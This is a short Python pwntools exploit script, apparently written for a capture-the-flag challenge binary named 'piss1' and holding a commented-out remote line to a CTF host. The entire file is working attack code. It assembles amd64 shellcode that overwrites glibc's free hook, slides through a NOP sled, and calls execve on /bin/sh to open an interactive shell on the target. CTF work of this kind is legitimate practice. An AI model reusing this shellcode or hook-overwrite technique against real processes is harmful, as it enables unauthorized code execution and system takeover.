from pwn import *

p = process("./piss1")
#p = remote("pwn.chall.pwnoh.io", "13384")
p.recvuntil("Type some hex (end with newline):")

context.arch = "amd64"
code = """
/* Offset to free_hook */
add rcx, 0xD301D

/* Value to write in free_hook */
mov rax, 0x13371337050

/* Overwrite free_hook */
mov qword ptr [rcx], rax

/* Go jump somewhere, really doesn't matter where */
mov rax, 0x13371337050
jmp rax

.rept 64
nop
.endr

/* Shellcode */
mov rdi, 0x68732f6e69622f
push rdi
mov eax, 0x3b
mov rdi, rsp
mov rsi, 0
mov rdx, 0
syscall

.align 256
lol:
.string "/bin/bash\\0"
"""
print(code)

assembled = asm(code)
p.sendline(assembled.hex())

p.interactive()
